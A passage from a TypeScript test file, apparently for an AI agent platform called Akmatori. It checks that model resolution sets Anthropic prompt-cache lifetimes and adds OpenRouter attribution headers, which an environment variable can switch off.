    const gatewayCall = opts.customTools.find((t: any) => t.name === "gateway_call");
    expect(gatewayCall.promptGuidelines.join("\n")).toContain("tools.gateway_fetch");
  });
});

describe("resolveModel prompt-cache lifetime", () => {
  it("declares Anthropic's 5-minute cache tier on a synthesized anthropic-messages spec", () => {
    const model = resolveModel("anthropic", "claude-not-in-catalog-9") as any;
    expect(model.api).toBe("anthropic-messages");
    expect(model.promptCache).toEqual({ short: 300 });
  });

  it("leaves promptCache unset on non-Anthropic synthesized specs", () => {
    const model = resolveModel("custom", "my-local-model", "http://llm.internal/v1") as any;
    expect(model.promptCache).toBeUndefined();
  });
});

describe("resolveModel OpenRouter attribution", () => {
  afterEach(() => {
    vi.unstubAllEnvs();
  });

  it("adds Akmatori attribution headers to built-in OpenRouter models", () => {
    // Both APIs OpenRouter built-ins use: openai-completions and anthropic-messages.
    for (const id of ["openai/gpt-5.5", "anthropic/claude-fable-5"]) {
      const model = resolveModel("openrouter", id);
      expect(model.headers).toEqual(OPENROUTER_ATTRIBUTION_HEADERS);
    }
  });

  it("adds them to synthesized OpenRouter specs", () => {
    const model = resolveModel("openrouter", "vendor/not-in-catalog-9");
    expect(model.headers?.["HTTP-Referer"]).toBe("https://akmatori.com");
    expect(model.headers?.["X-OpenRouter-Title"]).toBe("Akmatori");
  });

  it("adds them when a custom provider points at openrouter.ai", () => {
    const model = resolveModel("custom", "openai/gpt-5.5", "https://openrouter.ai/api/v1");
    expect(model.headers).toEqual(OPENROUTER_ATTRIBUTION_HEADERS);
  });

  it("sends no attribution headers to other providers", () => {
    expect(resolveModel("anthropic", "claude-sonnet-5").headers).toBeUndefined();
    expect(resolveModel("custom", "m", "https://llm.internal/v1").headers).toBeUndefined();
  });

  it("is turned off by AKMATORI_OPENROUTER_ATTRIBUTION=0", () => {
    vi.stubEnv("AKMATORI_OPENROUTER_ATTRIBUTION", "0");
    expect(resolveModel("openrouter", "openai/gpt-5.5").headers).toBeUndefined();
  });

  it("parses the opt-out value", () => {
    expect(openRouterAttributionEnabled(undefined)).toBe(true);
    expect(openRouterAttributionEnabled("")).toBe(true);
    expect(openRouterAttributionEnabled("1")).toBe(true);
    for (const off of ["0", "false", "FALSE", " no ", "off"]) {
      expect(openRouterAttributionEnabled(off)).toBe(false);
    }
  });
});
